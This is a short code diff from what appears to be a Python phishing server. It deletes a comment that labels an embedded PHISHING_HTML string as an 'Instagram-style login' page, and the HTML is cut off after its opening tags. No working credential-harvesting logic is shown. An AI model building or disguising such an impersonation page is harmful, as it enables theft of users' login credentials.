@@ -1,7 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import json
 
-# === Embedded phishing page (Instagram-style login) ===
 PHISHING_HTML = """
 <!DOCTYPE html>
 <html>
